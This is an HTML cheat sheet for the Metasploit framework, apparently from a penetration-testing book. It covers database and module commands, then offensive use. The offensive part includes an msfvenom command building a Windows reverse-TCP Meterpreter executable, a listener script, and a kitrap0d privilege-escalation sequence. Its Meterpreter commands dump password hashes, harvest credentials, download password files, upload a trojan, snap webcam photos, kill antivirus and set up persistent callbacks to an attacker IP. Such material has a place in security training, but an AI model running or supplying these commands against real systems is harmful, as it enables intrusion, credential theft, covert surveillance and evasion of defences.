<html><head></head><body><div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Metasploit Cheat Sheet</h1>
                </header>
            
            <article>
                
<p>Before starting the exploitation phase, you must know the Metasploit framework from start to finish, so I have prepared a quick reference (a cheat sheet) to the Metasploit framework for you.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Metasploit framework</h1>
                </header>
            
            <article>
                
<p>Start a Metasploit with the following script file:</p>
<pre><strong>$msfconsole -r test.rc</strong></pre>
<p>To run Metasploit, use the following command:</p>
<pre><strong>$msfconsole</strong></pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Using the database</h1>
                </header>
            
            <article>
                
<p><span>In Kali Linux, you will need to start up the <kbd>postgresql</kbd> server before using the database:</span></p>
<pre><strong><span>$ systemctl start postgresql</span></strong></pre>
<p><span>After starting <kbd>postgresql</kbd>, you will need to create and initialize the <kbd>msf</kbd> database with <kbd>msfdb init</kbd></span>:</p>
<pre><strong><span>$ msfdb init</span></strong></pre>
<p><span>If you just created a new exploit and want to refresh <kbd>metasploit db</kbd> to start using the newly created exploit, enter the following:</span></p>
<pre><strong><span>$service postgresql restart &amp;&amp; msfdb reinit</span></strong></pre>
<p><span>Then, type the following command:</span></p>
<pre><strong><span>$msfconsole -q</span></strong></pre>
<p><span>The <kbd>-q</kbd> will start <kbd>msfconsole</kbd> in debug mode, so if you made mistakes in your new exploit class, the debugger will then print it to the screen.</span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">More database-related commands</h1>
                </header>
            
            <article>
                
<ul>
<li><span><kbd>msf &gt; db_status</kbd>: This will confirm that Metasploit is successfully connected to the database</span></li>
<li><span><kbd>msf &gt; workspace</kbd>: This will display the currently selected workspaces</span></li>
<li><span><kbd>msf &gt; workspace [new workspace]</kbd>: This changes the current workspace to the new one selected</span></li>
<li><span><kbd>msf &gt; workspace -a [the name of the workspace to add]</kbd>: This is the name of the workspace to add</span></li>
<li><span><kbd>msf &gt; workspace -d [the name of the workspace to delete]</kbd>: This is the name of the workspace to delete</span></li>
<li><span><kbd>msf &gt; db_import [XML folder path]</kbd>: This will import a file from an earlier scan, for example, <kbd>db_import /root/msfu/nmapScan</kbd></span></li>
<li><span><kbd>msf &gt; db_nmap [nmap arguments]</kbd>: This will scan using Nmap, f</span><span>or example, <kbd>db_nmap -A 172.16.194.134</kbd></span></li>
<li><span><kbd>msf &gt; hosts</kbd>: This will list the hosts after a scan</span></li>
<li><span><kbd>msf &gt; services</kbd>: This will list the services found after a scan</span></li>
<li><span><kbd>msf &gt; creds</kbd>: This will list any found credentials after a brute-force scan</span></li>
<li><span><kbd>msf &gt; loot</kbd>: This will retrieve hash dumps if you have already compromised a system</span></li>
<li><span><kbd>msf &gt; db_export -f [format] [xml file path]</kbd>: </span><span>For example, <kbd>-</kbd></span><kbd><span>db_export -f xml /root/msfu/Exported.xml</span></kbd></li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Getting around</h1>
                </header>
            
            <article>
                
<ul>
<li><span><kbd>msf &gt; search</kbd>: This will locate a specific module according to the search criteria that you provide (try to execute <kbd>help search</kbd>)</span></li>
<li><span><kbd>msf &gt; search [any keyword]</kbd>: For example, <kbd>search apache version 2.3</kbd></span></li>
<li><span><kbd>msf &gt; grep &amp; search</kbd>: For example, <kbd>grep http search apache</kbd></span></li>
<li><strong><span>Search keywords</span></strong>:
<ul>
<li><span><kbd>app</kbd>: Modules that are client or server attacks</span></li>
<li><span><kbd>author</kbd>: Modules written by this author</span></li>
<li><span><kbd>bid</kbd>: Modules with a matching Bugtraq ID</span></li>
<li><span><kbd>cve</kbd>: Modules with a matching CVE ID</span></li>
<li><span><kbd>edb</kbd>: Modules with a matching Exploit-DB ID</span></li>
<li><span><kbd>name</kbd>: Modules with a matching descriptive name</span></li>
<li><span><kbd>platform</kbd>: Modules affecting this platform</span></li>
<li><span><kbd>ref</kbd>: Modules with a matching <kbd>ref</kbd></span></li>
<li><span><kbd>type</kbd>: Modules of a specific type (exploit, auxiliary, or post)</span></li>
</ul>
</li>
<li><span><strong>Examples</strong></span>:
<ul>
<li><kbd><span>msf &gt; search cve:2009 type:exploit app:client</span></kbd></li>
<li><kbd><span>msf &gt; search name:mysql</span></kbd></li>
<li><kbd><span>msf &gt; search platform:windows</span></kbd></li>
<li><kbd><span>msf &gt; search type:auxiliary</span></kbd></li>
</ul>
</li>
<li><span><strong>More commands</strong></span>:
<ul>
<li><span><kbd>msf &gt; help</kbd>: List the available commands</span></li>
<li><span><kbd>msf &gt; back</kbd>: Go back one step</span></li>
<li><span><kbd>msf &gt; exit</kbd>: Exit msfconsole</span></li>
</ul>
</li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Using modules</h1>
                </header>
            
            <article>
                
<ul>
<li><span><kbd>msf &gt; use [module name]</kbd>: Select a module to use it. For example, use <kbd>dos/windows/smb/ms09_001_write</kbd>.</span></li>
<li><span><kbd>msf &gt; show</kbd>: This will show info about a specific item in Metasploit.</span></li>
<li><span><kbd>msf &gt; show</kbd>: Entering <kbd>show</kbd> at the <kbd>msfconsole</kbd> prompt will display every module within Metasploit.</span></li>
<li><span><kbd>msf &gt; show options</kbd>: This will show the module options.</span></li>
<li><span><kbd>msf &gt; show auxiliary</kbd>: This will display a list of all of the available auxiliary modules within Metasploit.</span></li>
<li><span><kbd>msf &gt; show exploits</kbd>: This will get a listing of all exploits contained in the framework.</span></li>
<li><span><kbd>msf &gt; show payloads</kbd>: This will display all of the different payloads (either within Metasploit or in the same module).</span></li>
<li><span><kbd>msf &gt; show targets</kbd>: This will display which targets are supported within the context of an exploit module.</span></li>
<li><span><kbd>msf &gt; show advanced</kbd>: This will show you more advanced options if you wish to further fine-tune an exploit.</span></li>
<li><span><kbd>msf &gt; show encoders</kbd>: This will display a list of the encoders that are available within msfconsole.</span></li>
<li><span><kbd>msf &gt; show nops</kbd>: This will display the NOP generators that Metasploit has to offer.</span></li>
<li><span><kbd>msf &gt; info [module name]</kbd>: This will provide you with detailed information about a module. For example, <kbd>info exploit/windows/http/apache_chunked</kbd></span>.</li>
<li><span><kbd>msf &gt; check</kbd>: This will verify whether the target is vulnerable, but you will need to set the options first.</span></li>
<li><span><kbd>msf &gt; set</kbd>: The <kbd>set</kbd> command allows you to configure the framework options and parameters for the current module you are working with. For example, <kbd>set RHOST 172.16.194.134</kbd></span>.</li>
<li><span><kbd>msf &gt; setg</kbd>: This will set global variables within <kbd>msfconsole</kbd>. For example, <kbd>setg LHOST 10.0.0.100</kbd></span>.</li>
<li><span><kbd>msf &gt; unset</kbd>: The <kbd>unset</kbd> command removes a parameter that has been previously configured with <kbd>set</kbd>. You can remove all assigned variables with <kbd>unset all</kbd>. For example, <kbd>unset THREADS</kbd></span>.</li>
<li><span><kbd>msf &gt; save</kbd>: The <kbd>save</kbd> command will save your current environment and settings.</span></li>
<li><span><kbd>msf &gt; jobs [option]</kbd>: The <kbd>jobs</kbd> command provides the ability to list and terminate these jobs. Use the <kbd>jobs -h</kbd> command to get the available options. For example, <kbd>jobs -l</kbd></span>.</li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Miscellaneous</h1>
                </header>
            
            <article>
                
<ul>
<li><span><kbd>msf &gt; load [plugin name]</kbd>: The <kbd>load</kbd> command loads a plugin from Metasploit's plugin directory. Arguments are passed as <kbd>key=val</kbd> on the shell. For example, <kbd>load pcap_log</kbd></span>.</li>
<li><span><kbd>msf &gt; unload [plugin name]</kbd>: The <kbd>unload</kbd> command unloads a previously loaded plugin and removes any extended commands. For example, <kbd>unload pcap_log</kbd></span>.</li>
<li><span><kbd>msf &gt; loadpath [module path]</kbd>: The <kbd>loadpath</kbd> command will load a third-party module tree for the path so you can point Metasploit at your 0-day exploits, encoders, payloads, and so on. For example, <kbd>loadpath exploit/windows/test/test_module</kbd></span>.</li>
<li><span><kbd>msf &gt; connect [IP]</kbd>: This is similar to <kbd>netcat</kbd>. It is good for banner grabbing and interacting with the service. For example, <kbd>connect 192.168.1.10</kbd></span>.</li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">msfvenom</h1>
                </header>
            
            <article>
                
<p><kbd>msfvenom</kbd> can be used, for example, to generate a reverse TCP Meterpreter payload for Windows OS:</p>
<pre><strong>$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe</strong></pre>
<ul>
<li><strong><span>Platforms</span></strong>: The following are the platform values that we can use:</li>
</ul>
<p style="padding-left: 60px"> <span><kbd>Cisco</kbd> or <kbd>cisco</kbd>, </span><kbd>OSX</kbd> or <kbd>osx</kbd>, <kbd>Solaris</kbd> or <kbd>solaris</kbd>, <kbd>BSD</kbd> or <kbd>bsd</kbd>, <kbd>OpenBSD</kbd> or <kbd>openbsd</kbd>, <kbd>hardware</kbd>, <kbd>Firefox</kbd> or <kbd>firefox</kbd>, <kbd>BSDi</kbd> or <kbd>bsdi</kbd>, <kbd>NetBSD</kbd> or <kbd>netbsd</kbd>, <kbd>NodeJS</kbd> or <kbd>nodejs</kbd>, <kbd>FreeBSD</kbd> or <kbd>freebsd</kbd>, <kbd>Python</kbd> or <kbd>python</kbd>, <kbd>AIX</kbd> or <kbd>aix</kbd>, <kbd>JavaScript</kbd> or <kbd>javascript</kbd>, <kbd>HPUX</kbd> or <kbd>hpux</kbd>, <kbd>PHP</kbd> or <kbd>php</kbd>, <kbd>Irix</kbd> or <kbd>irix</kbd>, <kbd>Unix</kbd> or <kbd>unix</kbd>, <kbd>Linux</kbd> or <kbd>linux</kbd>, <kbd>Ruby</kbd> or <kbd>ruby</kbd>, <kbd>Java</kbd> or <kbd>java</kbd>, <kbd>Android</kbd> or <kbd>android</kbd>, <kbd>Netware</kbd> or <kbd>netware</kbd>, <kbd>Windows</kbd> or <kbd>windows</kbd>, <kbd>mainframe</kbd>, <kbd>multi</kbd>.</p>
<ul>
<li><span><strong>Executable formats</strong>: The f</span>ollowing are the executable formats that we can use:</li>
</ul>
<p style="padding-left: 60px"><kbd>asp</kbd>, <kbd>aspx</kbd>, <kbd>aspx-exe</kbd>, <kbd>dll</kbd>, <kbd>elf</kbd>, <kbd>elf-so</kbd>, <kbd>exe</kbd>, <kbd>exe-only</kbd>, <kbd>exe-service</kbd>, <kbd>exe-small</kbd>, <kbd>hta-psh</kbd>, <kbd>loop-vbs</kbd>, <kbd>macho</kbd>, <kbd>msi</kbd>, <kbd>msi-nouac</kbd>, <kbd>osx-app</kbd>, <kbd>psh</kbd>, <kbd>psh-net</kbd>, <kbd>psh-reflection</kbd>, <kbd>psh-cmd</kbd>, <kbd>vba</kbd>, <kbd>vba-exe</kbd>, <kbd>vba-psh</kbd>, <kbd>vbs</kbd>, <kbd>war</kbd>.</p>
<ul>
<li><strong><span>Transform formats</span></strong>: The following are the transform formats that we can use:</li>
</ul>
<p style="padding-left: 60px"><kbd>bash</kbd><span>,</span> <kbd>c</kbd><span>,</span> <kbd>csharp</kbd><span>,</span> <kbd>dw</kbd><span>,</span> <kbd>dword</kbd><span>,</span> <kbd>hex</kbd><span>,</span> <kbd>java</kbd><span>,</span> <kbd>js_be</kbd><span>,</span> <kbd>js_le</kbd><span>,</span> <kbd>num</kbd><span>,</span> <kbd>perl</kbd><span>,</span> <kbd>pl</kbd><span>,</span> <kbd>powershell</kbd><span>,</span> <kbd>ps1</kbd><span>,</span> <kbd>py</kbd><span>,</span> <kbd>python</kbd><span>,</span> <kbd>raw</kbd><span>,</span> <kbd>rb</kbd><span>,</span> <kbd>ruby</kbd><span>,</span> <kbd>sh</kbd><span>,</span> <kbd>vbapplication</kbd><span>,</span> <kbd>vbscript</kbd><span>.</span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Listener scripting</h1>
                </header>
            
            <article>
                
<pre><strong><span>$ touch script.rc<br/></span><span>$ echo use exploit/multi/handler &gt;&gt; script.rc<br/></span><span>$ echo set PAYLOAD windows/meterpreter/reverse_tcp &gt;&gt; script.rc<br/></span><span>$ echo set LHOST 192.168.0.114 &gt;&gt; script.rc<br/></span><span>$ echo set ExitOnSession false &gt;&gt; script.rc<br/></span><span>$ echo exploit -j -z &gt;&gt; script.rc<br/></span><span>$ msfconsole -r script.rc</span></strong></pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Meterpreter</h1>
                </header>
            
            <article>
                
<ul>
<li>
<p><span><kbd>msf &gt; sessions [options or ID]</kbd>: The <kbd>sessions</kbd> command allows you to list, interact with, and kill spawned sessions. The sessions can be shells, Meterpreter sessions, VNCs, and so on (use </span><kbd>sessions -h</kbd><span> to get help)</span><span>.</span></p>
</li>
<li>
<p><kbd>meterpreter &gt; background</kbd><span>: This will send the current Meterpreter session to the background and return you to the</span> <kbd>msf</kbd> <span>prompt.</span></p>
</li>
<li><span><kbd>meterpreter &gt; getuid</kbd>: Displays to the user whether the Meterpreter server is running on the host.</span></li>
<li><span><kbd>meterpreter &gt; sysinfo</kbd>: Displays the victim's OS info.</span></li>
<li><span><kbd>meterpreter &gt; cd</kbd>: Changes the current directory on the compromised system.</span></li>
<li><span><kbd>meterpreter &gt; ls</kbd>: Lists the current directory's contents.</span></li>
<li><span><kbd>meterpreter &gt; pwd</kbd>: Prints the current directory on the compromised system.</span></li>
<li><span><kbd>meterpreter &gt; ps</kbd>: Displays a list of running processes on the target.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/manage/migrate</kbd>: Migrates to another process on the victim.</span></li>
<li><span><kbd>meterpreter &gt; use priv</kbd>:  Use this command before executing the <kbd>getsystem</kbd> command.</span></li>
<li><span><kbd>meterpreter &gt; getsystem</kbd>: Use this command to elevate your privileges.</span></li>
</ul>
<p><span>If you get the error <kbd>priv_elevate_getsystem: Operation failed: Access is denied</kbd>, t</span><span>hen follow these steps:</span></p>
<pre><strong><span>meterpreter &gt; background</span></strong></pre>
<p><strong><span>Option 1</span></strong>:</p>
<pre><strong><span>msf &gt; use post/multi/recon/local_exploit_suggester<br/></span><span>msf post(local_exploit_suggester) &gt; show options<br/></span><span>msf post(local_exploit_suggester) &gt; run</span></strong></pre>
<p><strong><span>Option 2</span></strong>:</p>
<ul>
<li><span><kbd>msf &gt; use exploit/windows/local/</kbd>: List of all Windows exploits.</span></li>
<li><span><kbd>msf &gt; use exploit/windows/local/ms10_015_kitrap0d</kbd>: We've chosen one exploit from the list, as follows:</span></li>
</ul>
<pre style="padding-left: 60px"><strong><span>msf exploit(ms10_015_kitrap0d) &gt; show options<br/></span><span>msf exploit(ms10_015_kitrap0d) &gt; set SESSION 1<br/></span><span>msf exploit(ms10_015_kitrap0d) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br/></span><span>msf exploit(ms10_015_kitrap0d) &gt; set LHOST 192.168.1.100<br/></span><span>msf exploit(ms10_015_kitrap0d) &gt; set LPORT 4445<br/></span><span>msf exploit(ms10_015_kitrap0d) &gt; exploit<br/></span><span>meterpreter &gt; getuid<br/></span><span>Server username: NT AUTHORITY\SYSTEM - Hooray</span></strong></pre>
<ul>
<li><span><kbd>meterpreter &gt; search</kbd>: Provides a way of locating specific files on the target host. For example, <kbd>search -f passwords*.txt</kbd></span>.</li>
<li><span><kbd>meterpreter &gt; cat [file name path]</kbd>: Displays the content of a file when it's given as an argument.</span></li>
<li><span><kbd>meterpreter &gt; download [file name path]</kbd>: Downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path. For example, <kbd>download C:\\passwords.txt</kbd></span>.</li>
<li><span><kbd>meterpreter &gt; upload [local file name] [remote path]</kbd>: For example, <kbd>upload evil_trojan.exe c:\\windows\\system32</kbd></span>.</li>
<li><span><kbd>meterpreter &gt; execute [command]</kbd>: Runs a command on the target system</span></li>
<li><span><kbd>meterpreter &gt; shell</kbd>: Executes the shell (Terminal or DOS) on the target system.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/hashdump</kbd>: A post module that will dump the contents of the SAM database.</span></li>
<li><span><span><kbd>meterpreter &gt;ipconfig</kbd>: Displays the network interfaces and addresses on the remote machine.</span></span></li>
<li><span><kbd>meterpreter &gt; webcam_list</kbd>: Displays the currently available webcams on the target host.</span></li>
<li><span><kbd>meterpreter &gt; webcam_snap</kbd>: Grabs a picture from a connected webcam on the target system and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename. For example, <kbd>webcam_snap -i 1 -v false</kbd></span>.</li>
<li><span><kbd>meterpreter &gt; python_import [local python file]</kbd>: Imports a local Python file and executes it on the victim's machine. For example,  <kbd>meterpreter &gt; python_import -f /root/readAutoLogonREG.py</kbd></span>.</li>
<li><kbd><span>meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24</span></kbd></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/checkvm</kbd>: Checks to see if the compromised host is a virtual machine.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/credentials/credential_collector</kbd>: Harvests passwords hashes and tokens on the compromised host.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/dumplinks</kbd>: The <kbd>dumplinks</kbd> module parses the <kbd>.lnk</kbd> files in a user's recent documents, which could be useful for further information gathering.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/enum_applications</kbd>: Enumerates the applications that are installed on the compromised host.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/enum_logged_on_users</kbd>: Returns a list of current and recently logged on users, along with their SIDs.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/enum_shares</kbd>: Returns a list of both configured and recently used shares on the compromised system.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/enum_snmp</kbd>: Enumerates the SNMP service configuration on the target, if present, including the community strings.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/hashdump</kbd>: Dumps the local users' accounts on the compromised host using the registry.</span></li>
<li><span><kbd>meterpreter &gt; run post/windows/gather/usb_history</kbd>: Enumerates the USB drive history on the compromised system.</span></li>
<li><span><span><kbd>meterpreter &gt; run getcountermeasure</kbd>: Checks the security configuration on the victims' system and can disable other security measures, such as A/V, the firewall, and much more.</span></span></li>
<li><span><kbd>meterpreter &gt; run getgui -e</kbd>: Enables RDP on a target system if it is disabled.</span></li>
<li><span><kbd>meterpreter &gt; run gettelnet -e</kbd>: Enables Telnet on the victim if it is disabled.</span></li>
<li><span><kbd>meterpreter &gt; run killav</kbd>: Disables most antivirus programs running as a service on a target.</span></li>
<li><span><kbd>meterpreter &gt; run remotewinenum -u administrator -p password123 -t 10.0.0.100</kbd>: Enumerates the system information through <kbd>wmic</kbd> on the victim. Makes note of where the logs are stored.</span></li>
<li><span><kbd>meterpreter &gt; run scraper</kbd>: Grabs the system information, including the entire registry</span></li>
<li><span><kbd>meterpreter &gt; run winenum</kbd>: This makes for a very detailed Windows enumeration tool. It dumps tokens, hashes, and much more.</span></li>
<li><span><kbd>meterpreter &gt; run persistence -U -i 10 -p 443 -r 192.168.1.5</kbd>: Configures our persistent Meterpreter session to wait until a user logs on to the remote system and tries to connect back to our listener every 10 seconds at IP address <kbd>192.168.1.5</kbd> on port <kbd>443</kbd>.</span></li>
</ul>


            </article>

            
        </section>
    </div>



  </body></html>